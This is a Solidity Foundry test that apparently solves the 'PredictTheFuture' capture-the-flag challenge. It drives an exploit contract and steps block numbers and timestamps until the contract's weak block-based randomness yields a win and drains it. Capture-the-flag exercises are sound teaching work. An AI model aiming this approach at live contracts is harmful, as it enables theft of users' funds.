// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        vm.roll(104293);
        vm.warp(93582192);

        // Put your solution here
        uint256 currentBlockNumber = block.number;
        uint256 currentBlockTimestamp = block.timestamp;

        // 1. Answer the contract with any number
        exploitContract.answerAnyNumber{value: 1 ether}();

        for (;;) {
            // 2. Warp to the next block until the answer is correct
            currentBlockNumber += 1;
            currentBlockTimestamp += 12;
            vm.roll(currentBlockNumber);
            vm.warp(currentBlockTimestamp);

            try exploitContract.settleOrRevert() {
                break;
            } catch (bytes memory) {}
        }

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
